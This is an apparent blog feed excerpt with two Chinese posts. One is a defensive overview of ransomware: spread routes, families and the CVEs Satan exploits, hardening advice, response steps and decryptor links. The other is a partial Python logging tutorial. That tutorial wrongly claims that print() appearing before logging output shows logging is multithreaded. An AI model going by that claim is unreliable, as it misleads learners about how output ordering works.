      <title>网络安全之认识勒索病毒</title>
      <link href="/posts/8510060b/"/>
      <url>/posts/8510060b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230323/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92.png" alt="勒索病毒"></p><h2 id="一、什么是勒索病毒"><a href="#一、什么是勒索病毒" class="headerlink" title="一、什么是勒索病毒"></a>一、什么是勒索病毒</h2><p>勒索病毒，是一种新型电脑病毒，伴随数字货币兴起，主要以邮件、程序木马、网页挂马、服务器入侵、捆绑软件等多种形式进行传播，一旦感染将给用户带来无法估量的损失。如果遭受勒索病毒攻击，将会使绝大多数文件被加密算法加密，并添加一个特殊的后缀，用户无法读取原文件内容，被感染者一般无法解密，必须拿到解密的私钥才有可能无损还原被加密文件。而拿到解密的私钥，通常需要向攻击者支付高昂的赎金，这些赎金必须是通过数字货币支付，一般无法溯源，因此极易造成严重损失。</p><p>一般被勒索病毒感染后，将导致重要文件无法读取、关键数据被损坏、计算机被锁死无法正常使用等情况；为了指引被感染者缴纳赎金，勒索病毒还会在桌面等明显位置生成勒索提示文件，被感染者需要通过缴纳高额赎金才能获取解密密钥恢复计算机系统和数据文件的正常使用，多数情况即使缴纳了高额的赎金也未必能正常恢复数据。因此，勒索病毒具有数据恢复代价大和数据恢复可能性极低的特点。</p><h2 id="二、勒索病毒传播路径"><a href="#二、勒索病毒传播路径" class="headerlink" title="二、勒索病毒传播路径"></a>二、勒索病毒传播路径</h2><p>常见勒索病毒传播途径包括：</p><ol><li>网站挂马。用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。</li><li>邮件传播。邮件传播是目前互联网上常见的病毒传播方式。攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。</li><li>漏洞传播。通过计算机操作系统和应用软件的漏洞攻击并植入病毒是近年来流行的病毒传播方式。最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。</li><li>捆绑传播。攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。</li><li>介质传播。攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。此种传播途径往往发生在文印店、公共办公区域等高频交叉使用可移动存储介质的场所，也可能通过广告活动派发、街区丢弃等方式实现诱导用户使用携带勒索病毒的U盘、光盘。携带勒索病毒的光盘、U盘一旦接入计算机，勒索病毒即可能随着其自动运行或用户点击运行导致计算机被感染。</li></ol><h2 id="三、勒索病毒防护难点"><a href="#三、勒索病毒防护难点" class="headerlink" title="三、勒索病毒防护难点"></a>三、勒索病毒防护难点</h2><p>教育、企业、制造业、医疗、政府等行业由于数据重要性和较好的经济能力，已经成为勒索团队的重点攻击目标。以下是勒索病毒常见的攻击行为。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230323/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA.png" alt="勒索病毒攻击行为"></p><p>从勒索病毒的攻击行为来看，勒索病毒的防护存以下几个主要难点：</p><ul><li>勒索病毒变种多样 ：对程序 / 脚本的加壳、混淆操作，已经有一套相当成熟的自动化流程，能够快速对病毒进行变种，从而绕过传统静态防护。</li><li>边界突破手段多样：包括但不限于 RDP 爆破、SMB 爆破、漏洞利用、钓鱼邮件等等，其中爆破手段是最常使用的入侵手法。</li><li>防御规避手段多样：如无文件攻击、白进程利用、卸载安全服务等，从运营数据看 ,</li><li>采用黑客工具直接卸载终端安全服务、利用白进程进行加密的绕过手段是最为常见。</li><li>勒索病毒识别精准度不足：部分终端防护可以识别出“病毒”，但不能进一步识别出“勒索病毒”，未引起足够重视，导致后续攻击成功。</li></ul><h2 id="四、常见的勒索病毒"><a href="#四、常见的勒索病毒" class="headerlink" title="四、常见的勒索病毒"></a>四、常见的勒索病毒</h2><h3 id="1、GlobeImposter-勒索病毒"><a href="#1、GlobeImposter-勒索病毒" class="headerlink" title="1、GlobeImposter 勒索病毒"></a>1、GlobeImposter 勒索病毒</h3><p>Globelmposter3.0家族的变种采用RSA+AES算法加密，目前该勒索病毒加密的文件暂无解密工具，文件被加密后会被加上Ox4444、China4444、Help4444、Rat4444 、Tiger4444 、Rabbit4444、Dragon4444 、Snake4444 、Horse4444、Goat4444 、Monkey4444、Rooster4444、Dog4444等后缀。在被加密的目录下会生成一个名为”HOW_TO_BACK_FILES”的txt文件，显示受害者的个人ID序列号以及黑客的联系方式等。</p><p>GlobeImposter病毒本身不具备传播性。主要通过垃圾邮件和RDP暴破植入传播。</p><h3 id="2、GandCrab-勒索病毒"><a href="#2、GandCrab-勒索病毒" class="headerlink" title="2、GandCrab 勒索病毒"></a>2、GandCrab 勒索病毒</h3><p>GandCrab勒索病毒于2018年1月面世以来，短短一年内历经多次版本更新，目前最新的版本为V5。该病毒利用多种方式对企业网络进行攻击传播，受感染主机上的数据库、文档、图片、压缩包等文件将被加密，若没有相应数据或文件的备份，将会影响业务的正常运行。从2018年9月份V5版本面世以来，GandCrab出现了包括了5.0、5.0.2、5.0.3、5.0.4以及最新的5.0.5多个版本的变种。病毒采用Salsa20和RSA-2048算法对文件进行加密，并修改文件后缀为.GDCB、.GRAB、.KRAB或5-10位随机字母，勒索信息文件为GDCB-DECRYPT.txt、KRAB-DECRYPT.txt、[5-10随机字母]-DECRYPT.html\txt，并将感染主机桌面背景替换为勒索信息图片。</p><p>GandCrab病毒家族主要通过RDP暴力破解、钓鱼邮件、捆绑恶意软件、僵尸网络以及漏洞利用传播。病毒本身不具有蠕虫传播能力，但会通过枚举方式对网络共享资源进行加密，同时攻击者往往还会通过内网人工渗透方式，利用口令提取、端口扫描、口令爆破等手段对其他主机进行攻击并植入该病毒。主要影响Windows 系统</p><h3 id="3、Satan-变种病毒"><a href="#3、Satan-变种病毒" class="headerlink" title="3、Satan 变种病毒"></a>3、Satan 变种病毒</h3><p>撒旦（Satan）勒索病毒最开始可以追溯到2017年1月，当时病毒作者提供一个门户网站（RaaS，勒索软件即服务）允许任何人注册和创建撒旦勒索软件的自定义版本。<br>2017年11月左右，撒旦开发者开始更新勒索软件的计划，以更好地适应这些趋势。他们采取的第一步是在Satan程序中加入EternalBlue SMB漏洞的攻击和扫描模块。添加此漏洞意味着在撒旦感染计算机后，勒索软件将使用EternalBlue扫描本地网络，查找具有过时SMB服务的计算机并感染它们，从而最大限度地提高攻击效果。<br>2018年5月底出现了撒旦(Satan)勒索病毒的最新的变种，它不仅仅利用了永恒之蓝漏洞，还利用了多个WEB相关的漏洞进行传播。<br>2018年10月底MalwareHunterTeam发现了一款新型的Satan勒索病毒——DBGer勒索病毒。其属于撒旦(Satan)勒索病毒的最新的变种样本，不仅仅利用了之前的一些安全漏洞，同时还加上了Mimikatz的功能。其加密后的文件后缀名变为了.dbger。<br>2018年11月初，发现部分金融客户出现linux和windows跨平台的远控病毒样本，其样本行为与本次捕获样本极其相似。<br>2018年11月底，国内金融厂商开始出现Satan的最新变种，可以在Linux和Windows平台同时进行传播。将本地文件进行勒索加密，将加密后的文件名修改为.lucky。同时在Linux和Windows平台进行蠕虫式传播。</p><p>Satan病毒家族通过下面8种通用漏洞进行传播。目前发现Satan在linux平台会进行内部IP遍历+端口列表的方式进行漏洞扫描。在windows平台会以IP列表+端口列表的方式进行漏洞扫描。<br>JBoss反序列化漏洞(CVE-2013-4810)<br>JBoss默认配置漏洞(CVE-2010-0738)<br>Tomcat任意文件上传漏洞（CVE-2017-12615）<br>Tomcat web管理后台弱口令爆破<br>Weblogic WLS 组件漏洞（CVE-2017-10271）<br>Windows SMB远程代码执行漏洞MS17-010<br>Apache Struts2远程代码执行漏洞S2-045<br>Apache Struts2远程代码执行漏洞S2-057</p><h3 id="4、Sodinoki-勒索病毒"><a href="#4、Sodinoki-勒索病毒" class="headerlink" title="4、Sodinoki 勒索病毒"></a>4、Sodinoki 勒索病毒</h3><p>业内发现邮件附件中的恶意样本，经分析，样本为2019年6月新出的sodinokibi勒索病毒。该病毒以钓鱼邮件来传播，邮件附件中包含伪装成word文档的可执行文件，诱导员工打开附件，加密主机文件。<br>Sodinokibi勒索病毒暂无解密工具，可先将被加密的重要文件、勒索信息文件备份保存，以待将来有解密工具时解密。</p><h2 id="五、勒索病毒发展趋势"><a href="#五、勒索病毒发展趋势" class="headerlink" title="五、勒索病毒发展趋势"></a>五、勒索病毒发展趋势</h2><p>随着勒索技术的发展，勒索病毒呈现加密速度更快，跨平台发展的趋势。</p><ul><li>加密方式更多的转向“间歇性加密”，加密速度更快</li></ul><p>2021 年中旬，LockFile 勒索软件是首批使用间歇性加密来逃避检测机制的主要勒索软件系列之一，该勒索软件每隔 16 个字节对文件进行加密。此后，越来越多的勒索软件操作加入了这一趋势。如 BlackCat(ALPHV)、PLAY、Qyick、Agenda、Black Basta 等。间歇性加密指对受害者文件进行部分加密，这种加密方法不仅可以大大提高加密速度也可以帮助勒索软件运营商逃避基于统计分析的勒索软件检测技术。</p><ul><li>编程语言更多的转向Rust，实现跨平台勒索</li></ul><p>近年，越来越多的勒索软件编程语言转向 Rust 语言。该语言不仅具有与 C/C++ 类似的性能开发优势，而且具有更好的内存管理实现并发编程以避免内存错误，此外在静态分析工具低检出率方面也存在优势。BlackCat是第一个使用Rust的专业/商业化分布式恶意软件家族，也是迄今为止最繁荣的。<br>Rust 是一种跨平台语言，使威胁行为者能够轻松地为 Windows 和 Linux 等不同操作系统创建定制的恶意软件。现在有不少于 10 个勒索软件家族推出了针对 Linux 系统的版本，其中包括 REvil 的 Linux 版本、DarkSide、Dark Angels 、BlackMatter 以及 Defray777 等家族。勒索团伙倾向于以企业为目标，随着越来越多的组织将业务迁移到 VM 以简化设备管理和提高资源利用效率，将攻击目标转向 Linux 平台具有良好的商业意义，因为这样做可以让他们以最小的努力加密多个服务器。</p><h2 id="六、勒索病毒防护建议："><a href="#六、勒索病毒防护建议：" class="headerlink" title="六、勒索病毒防护建议："></a>六、勒索病毒防护建议：</h2><ol><li>定期做好重要数据、文件的备份工作；</li><li>及时更新升级操作系统和应用软件，修复存在的中高危漏洞；</li><li>安装正版杀毒软件并及时升级病毒库，定期进行全面病毒扫描查杀；</li><li>在系统中禁用U盘、移动硬盘、光盘的自动运行功能，不要使用/打开来路不明的U盘、光盘、电子邮件、网址链接、文件；</li><li>避免使用弱口令，为每台服务器和终端设置不同口令，且采用大小写字母、数字、特殊字符混合的高复杂度组合结构，口令位数应8位以上；</li><li>不要在网上下载安装盗版软件、非法破解软件以及激活工具。</li></ol><h2 id="七、勒索病毒应急处置流程"><a href="#七、勒索病毒应急处置流程" class="headerlink" title="七、勒索病毒应急处置流程"></a>七、勒索病毒应急处置流程</h2><h3 id="1、-检测阶段"><a href="#1、-检测阶段" class="headerlink" title="1、 检测阶段"></a>1、 检测阶段</h3><p>如何发现勒索病毒，可通过如下两个场景进行识别：</p><ul><li>场景一：感染但未加密<br>从攻击者渗透进入内部网络的某一台主机到执行加密行为往往有一段时间，如果在这段时间能够做出响应，完全可以避免勒索事件的发生。如果有以下情况，可能是处于感染未加密状态：</li></ul><ol><li>监测设备告警<br>如果使用了监测系统进行流量分析、威胁监测，系统产生大量告警日志，例如“SMB 远程溢出攻击”、“弱口令爆破”等，可能是病毒在尝试扩散。</li><li>资源占用异常<br>病毒会伪装成系统程序，释放攻击包、扫描局域网络 445 端口等占用大量系统资源，当发现某个疑似系统进程的进程在长期占用 CPU 或内存，有可能是感染病毒。</li></ol><ul><li>场景二：感染已加密<br>如果有以下情况，可能是处于感染且已加密状态：</li></ul><ol><li>统一的异常后缀<br>勒索病毒执行加密程序后会加密特定类型的文件，不同的勒索病毒会加密几十到几百种类型的文件，基本都会包括常见的文档、图片、数据库文件。当文件夹下文件变成如下统一异常不可用后缀，就是已经被加密了。</li><li>勒索信或桌面被篡改<br>勒索病毒加密文件的最终目的是索要赎金，所以会在系统明显位置如桌面上留下文件提示，或将勒索图片更改为桌面。勒索信绝大多数为英文，引导被勒索的用户交赎金。<h3 id="2、抑制阶段"><a href="#2、抑制阶段" class="headerlink" title="2、抑制阶段"></a>2、抑制阶段</h3>发现勒索病毒后如何进行隔离：</li></ol><ul><li>采取可行措施进行隔离，避免影响其它主机（如断网隔离）</li><li>通过边界控制设备，防止网络区域间相互影响</li></ul><p>防止勒索病毒扩散：</p><ul><li>采取及时的补救加固措施（安全加固）</li><li>相关漏洞的扫描修补与跟踪</li><li>配置核查<h3 id="3、处置阶段"><a href="#3、处置阶段" class="headerlink" title="3、处置阶段"></a>3、处置阶段</h3>信息收集：</li><li>IT管理人员截图取证主机中的勒索信息文件</li><li>截图取证被加密的时间和文件后缀名</li><li>检查服务器开放端口情况、补丁更新情况，并截图取证</li><li>检查服务器当日的安全日志，截图取证或导出当天日志<h3 id="4、-恢复阶段"><a href="#4、-恢复阶段" class="headerlink" title="4、 恢复阶段"></a>4、 恢复阶段</h3>业务恢复：</li><li>从备份中恢复损坏的数据 </li><li>调整可能影响业务正常运转的策略</li></ul><p>文件解密：</p><ul><li>付费风险：部分中招主机可能包含关键信息，企业处于业务考虑可能会考虑通过比特币付款，但不能确认付款可以恢复数据，建议企业慎重考虑。</li><li>解密工具：可查看安全厂商已发布部分勒索病毒的解密工具。<h3 id="5、安全加固"><a href="#5、安全加固" class="headerlink" title="5、安全加固"></a>5、安全加固</h3>通常应从如下方面进行加固：</li><li>多数勒索软件会利用RDP(远程桌面协议)暴力破解传播，在不影响业务的前提下避免3389端口对外开放。利用IPS、防火墙等设备对3389端口进行防护</li><li>开启windows自身的防火墙尽量关闭3389、445、139、135等不用的高危端口</li><li>在计算机中配置账户锁定策略，连续登陆失败即锁定账户</li><li>要求每台服务器设置唯一口令，且禁止设置弱口令（复杂度要求采用大小写字母、数字、特殊符号混合）</li><li>对员工进行安全意识培训，避免打开陌生邮件的附件、下载破解版软件和运行来源不明的程序</li><li>定时对重要数据进行异地备份，防止数据破坏和丢失</li><li>及时更新系统及应用版本，及时打漏洞补丁</li><li>及时安装防病毒软件，并更新到最新的病毒库和引擎</li><li>定时通过扫描器做专项口令排查，可排查通用口令和弱口令</li></ul><h2 id="部分公开的勒索相关解密工具"><a href="#部分公开的勒索相关解密工具" class="headerlink" title="部分公开的勒索相关解密工具"></a>部分公开的勒索相关解密工具</h2><p>公开的勒索病毒相关解密工具（Free Ransomware Decryption Tools），可供应急查询使用：<br>1、kaspersky<br>Free Ransomware Decryptors - Kaspersky Lab <a href="https://noransom.kaspersky.com/" target="_blank" rel="noopener">https://noransom.kaspersky.com/</a><br>2、avast<br>Free Ransomware Decryption Tools | Unlock Your Files | Avast<br><a href="https://www.avast.com/ransomware-decryption-tools" target="_blank" rel="noopener">https://www.avast.com/ransomware-decryption-tools</a><br>3、avg<br>Free Ransomware Decryption Tools | Unlock Your Files | AVG<br><a href="https://www.avg.com/en-us/ransomware-decryption-tools" target="_blank" rel="noopener">https://www.avg.com/en-us/ransomware-decryption-tools</a><br>4、No More Ransom<br>The No More Ransom Project<br><a href="https://www.nomoreransom.org/en/decryption-tools.html" target="_blank" rel="noopener">https://www.nomoreransom.org/en/decryption-tools.html</a><br>5、Bitdefender<br>Free Tools – Bitdefender Labs<br><a href="https://labs.bitdefender.com/category/free-tools/" target="_blank" rel="noopener">https://labs.bitdefender.com/category/free-tools/</a><br>6、MalwareHunter<br>ID Ransomware<br><a href="https://id-ransomware.malwarehunterteam.com/index.php" target="_blank" rel="noopener">https://id-ransomware.malwarehunterteam.com/index.php</a><br>7、McAfee<br>McAfee Ransomware Recover (Mr2) | McAfee Free Tools<br><a href="https://www.mcafee.com/enterprise/en-us/downloads/free-tools/ransomware-decryption.html" target="_blank" rel="noopener">https://www.mcafee.com/enterprise/en-us/downloads/free-tools/ransomware-decryption.html</a><br>8、 Trend Micro<br>Using the Trend Micro Ransomware File Decryptor Tool<br><a href="https://success.trendmicro.com/portal_kb_articledetail?solutionid=1114221" target="_blank" rel="noopener">https://success.trendmicro.com/portal_kb_articledetail?solutionid=1114221</a></p><hr><p>博客文章：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python日志logging实战教程</title>
      <link href="/posts/c24f493c/"/>
      <url>/posts/c24f493c/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是日志"><a href="#一、什么是日志" class="headerlink" title="一、什么是日志"></a>一、什么是日志</h2><p>在<a href="http://xiejava.ishareread.com/posts/6a8b36cb/" target="_blank" rel="noopener">《网络安全之认识日志采集分析审计系统》</a>中我们认识了日志。日志数据的核心就是日志消息或日志，日志消息是计算机系统、设备、软件等在某种刺激下反应生成的东西。</p><p>日志数据（log data）就是一条日志消息的内在含义，用来告诉你为什么生成日志消息的信息。日志（log）指用于展示某些事件全貌的日志消息的集合。</p><h2 id="二、为什么要写日志"><a href="#二、为什么要写日志" class="headerlink" title="二、为什么要写日志"></a>二、为什么要写日志</h2><p>日志是对软件执行时所发生事件的一种追踪方式。软件开发人员对他们的代码添加日志调用，借此来指示某事件的发生。一个事件通过一些包含变量数据的描述信息来描述。对于软件系统来说，健全的日志记录是程序调试、故障定位、事件追溯的有效手段。</p><p>日志通用的几种类型：</p><ul><li>信息（Info）:告诉用户和管理员发生了一些没有风险的事情。</li><li>调试（Debug）:在应用程序代码运行时生成调试信息，给软件开发人员提供故障检测和定位问题的帮助。</li><li>警告（Warning）:缺少需要的文件、参数、数据，但又不影响系统运行时生成警告。</li><li>错误（Error）:传达在计算机系统重出现的各种级别的错误。许多错误消息只能给出为什么出错的起点，要寻找出导致错误发生的根本原因还需要进一步的调查。</li></ul><h2 id="三、Python日志logging模块实战"><a href="#三、Python日志logging模块实战" class="headerlink" title="三、Python日志logging模块实战"></a>三、Python日志logging模块实战</h2><p>在进行Python程序开发时，Python提供了logging模块，能够很好的帮助开发人员很方便的的记录日志信息。</p><p>对于简单的日志使用来说日志功能提供了一系列便利的函数。它们是 debug()，info()，warning()，error() 和 critical()。想要决定何时使用日志，请看下表，其中显示了对于每个通用任务集合来说最好的工具。</p><table><thead><tr><th>你想要执行的任务</th><th>此任务的最好的工具</th></tr></thead><tbody><tr><td>对于命令行或程序的应用，结果显示在控制台。</td><td>print()</td></tr><tr><td>在对程序的普通操作发生时提交事件报告(比如：状态监控和错误调查)</td><td>logging.info() 函数(当有诊断目的需要详细输出信息时使用 logging.debug() 函数)</td></tr><tr><td>提出一个警告信息基于一个特殊的运行时事件</td><td>warnings.warn() 位于代码库中，该事件是可以避免的，需要修改客户端应用以消除告警logging.warning() 不需要修改客户端应用，但是该事件还是需要引起关注</td></tr><tr><td>对一个特殊的运行时事件报告错误</td><td>引发异常</td></tr><tr><td>报告错误而不引发异常(如在长时间运行中的服务端进程的错误处理)</td><td>logging.error(), logging.exception() 或 logging.critical() 分别适用于特定的错误及应用领域</td></tr></tbody></table><p>日志功能应以所追踪事件级别或严重性而定。各级别适用性如下（以严重性递增）：</p><table><thead><tr><th>级别</th><th>何时使用</th></tr></thead><tbody><tr><td>DEBUG</td><td>细节信息，仅当诊断问题时适用。</td></tr><tr><td>INFO</td><td>确认程序按预期运行。</td></tr><tr><td>WARNING</td><td>表明有已经或即将发生的意外（例如：磁盘空间不足）。程序仍按预期进行。</td></tr><tr><td>ERROR</td><td>由于严重的问题，程序的某些功能已经不能正常执行</td></tr><tr><td>CRITICAL</td><td>严重的错误，表明程序已不能继续执行</td></tr></tbody></table><p>默认的级别是 WARNING，意味着只会追踪该级别及以上的事件，除非更改日志配置。</p><p>所追踪事件可以以不同形式处理。最简单的方式是输出到控制台。另一种常用的方式是写入磁盘文件。</p><p>Python的logging库采用模块化方法，并提供了几类组件：记录器，处理程序，过滤器和格式化程序。</p><ul><li>记录器（Logger）：提供应用程序代码直接使用的接口。 </li><li>处理器（Handler）：将日志记录（由记录器创建）发送到适当的目的地。</li><li>筛选器（Filter）：提供了更细粒度的功能，用于确定要输出的日志记录。 </li><li>格式器（Formatter）：程序在最终输出日志记录的内容格式。</li></ul><p>logging的工作流程：以记录器Logger为对象，设置合适的处理器Handler，辅助以筛选器Filter、格式器Formatter，设置日志级别以及常用的方法，最终输出理想的日志记录给到指定目标<br>一个Logger可以包含多个Handler；<br>每个Handler可以设置自己的Filter和Formatter；<br>记录器和处理器中的日志事件信息流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/1_logging%E6%B5%81%E7%A8%8B.png" alt="日志事件信息流程"></p><p>接下来我们通过几个简单的应用场景来进行日志记录实战</p><h3 id="1、最简单的日志记录"><a href="#1、最简单的日志记录" class="headerlink" title="1、最简单的日志记录"></a>1、最简单的日志记录</h3><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/2_%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E7%BB%93%E6%9E%9C.png" alt="最简单的日志记录结果"></p><p>这里体现了两个问题：<br>1.通过print()在控制台打印的日志，比logging打印的日志提前打印显示，说明日志记录是多线程的。在平时日志调试跟踪的时候注意这一点，print()的信息有时会打印在logging前有时会在logging后。</p><p>2.debug和info的日志没有打印出来，说明logging默认的日志级别是waring。<br>如果要设置改变默认的日志级别可以通过配置来设置日志级别如：level=logging.DEBUG</p><h3 id="2、设置日志级别"><a href="#2、设置日志级别" class="headerlink" title="2、设置日志级别"></a>2、设置日志级别</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.DEBUG) <span class="comment">#设置日志级别</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/3_%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BB%93%E6%9E%9C.png" alt="设置日志级别结果"></p><p>这下从DEBUG到CRITICAL级别的都打印出来了。</p><h3 id="3、设置日志显示格式"><a href="#3、设置日志显示格式" class="headerlink" title="3、设置日志显示格式"></a>3、设置日志显示格式</h3><p>默认的日志打印显示的格式是， 日志级别：logger实例名称（默认是root）：日志消息内容<br>如这里显示的是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:root:this is print_hi debug</span><br><span class="line">INFO:root:this is print_hi info</span><br><span class="line">WARNING:root:this is print_hi warning</span><br><span class="line">ERROR:root:this is print_hi error</span><br><span class="line">CRITICAL:root:this is print_hi critical</span><br></pre></td></tr></table></figure><p>在真实使用的场景下，一般都要显示日志的时间，我们可以通过设置日志显示格式来调整我们需要显示的日志格式和内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p>这里设置了日志发生时间、日志级别、logger实例名称、日志发生的文件名、日志发生所在的行、日志消息内容。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/4_%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F.png" alt="设置日志格式"></p><p>更多的logRecord属性如下：</p><table><thead><tr><th>属性名称</th><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>args</td><td>此属性不需要用户进行格式化。</td><td>合并到 msg 以产生 message 的包含参数的元组，或是其中的值将被用于合并的字典（当只有一个参数且其类型为字典时）。</td></tr><tr><td>asctime</td><td>%(asctime)s</td><td>表示 LogRecord 何时被创建的供人查看时间值。 默认形式为 ‘2003-07-08 16:49:45,896’ （逗号之后的数字为时间的毫秒部分）。</td></tr><tr><td>created</td><td>%(created)f</td><td>LogRecord 被创建的时间（即 time.time() 的返回值）。</td></tr><tr><td>exc_info</td><td>此属性不需要用户进行格式化。</td><td>异常元组（例如 sys.exc_info）或者如未发生异常则为 None。</td></tr><tr><td>filename</td><td>%(filename)s</td><td>pathname 的文件名部分。</td></tr><tr><td>funcName</td><td>%(funcName)s</td><td>函数名包括调用日志记录。</td></tr><tr><td>levelname</td><td>%(levelname)s</td><td>消息文本记录级别（’DEBUG’，’INFO’，’WARNING’，’ERROR’，’CRITICAL’）</td></tr><tr><td>levelno</td><td>%(levelno)s</td><td>消息数字的记录级别 (DEBUG, INFO, WARNING, ERROR, CRITICAL)</td></tr><tr><td>lineno</td><td>%(lineno)d</td><td>发出日志记录调用所在的源行号（如果可用）。</td></tr><tr><td>message</td><td>%(message)s</td><td>记入日志的消息，即 msg % args 的结果。 这是在发起调用 Formatter.format() 时设置的。</td></tr><tr><td>module</td><td>%(module)s</td><td>模块 (filename 的名称部分)。</td></tr><tr><td>msecs</td><td>%(msecs)d</td><td>LogRecord 被创建的时间的毫秒部分。</td></tr><tr><td>msg</td><td>此属性不需要用户进行格式化。</td><td>在原始日志记录调用中传入的格式字符串。 与 args 合并以产生 message，或是一个任意对象 (参见 使用任意对象作为消息)。</td></tr><tr><td>name</td><td>%(name)s</td><td>用于记录调用的日志记录器名称。</td></tr><tr><td>pathname</td><td>%(pathname)s</td><td>发出日志记录调用的源文件的完整路径名（如果可用）。</td></tr><tr><td>process</td><td>%(process)d</td><td>进程ID（如果可用）</td></tr><tr><td>processName</td><td>%(processName)s</td><td>进程名（如果可用）</td></tr><tr><td>relativeCreated</td><td>%(relativeCreated)d</td><td>以毫秒数表示的 LogRecord 被创建的时间，即相对于 logging 模块被加载时间的差值。</td></tr><tr><td>stack_info</td><td>此属性不需要用户进行格式化。</td><td>当前线程中从堆栈底部起向上直到包括日志记录调用并引发创建当前记录堆栈帧创建的堆栈帧信息（如果可用）。</td></tr><tr><td>thread</td><td>%(thread)d</td><td>线程ID（如果可用）</td></tr><tr><td>threadName</td><td>%(threadName)s</td><td>线程名（如果可用）</td></tr></tbody></table><h3 id="4、记录日志到日志文件"><a href="#4、记录日志到日志文件" class="headerlink" title="4、记录日志到日志文件"></a>4、记录日志到日志文件</h3><p>logging默认是显示在控制台，在真实生产环境肯定时需要将日志记录到日志文件的。logging也是可以通过配置很方便的将日志记录到日志文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span 